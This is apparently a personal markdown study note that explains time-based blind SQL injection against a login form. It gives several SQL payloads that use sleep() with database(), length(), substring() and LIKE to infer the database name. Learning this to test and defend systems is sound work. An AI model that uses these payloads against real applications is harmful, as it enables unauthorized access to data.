# time-based sql injection
* for instances where nothing is returned to the browser whether or not the query was successful
    - one can use time to infer on the status of and enumerate the db
* say you have the db from [1-sql][def]
    * say the db is hooked to an app and the app has a log-in page
    * the login page has a form whose input fields are `username` and `password`
* the query in the BE will be

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f";
    ```

* we can use said query to retrieve unauthorised info eg. db name, host username, hostname, db version etc
* suppose we send the following query:

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        or if(database()="login", sleep(10), 0);
    ```

    - now, suppose the `sleep` operation occurred (the system sleeps for 10s); it tells you, the attacker, that the name of the db is *login*
* **!important!** you require a `WHERE` statement or equivalent to perform this form of magic
* you realise that we can do almost anything; case in point:

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        or if(length(database())="1", sleep(10), 0);
        -- sleeps for 10s if the name of db is one char long
        -- you can use `>`, `>=`, `<`, `<=` etc
    ```

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        or if(substring(database(),1,1)="a", sleep(10), 0);
        -- sleeps for 10s if the first letter of the db name is `a`
    ```

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        or if(database() like "%a%", sleep(10), 0);
        -- sleeps for 10s if the db name contains the letter `a`
    ```

* 


[def]: ./1-sql.md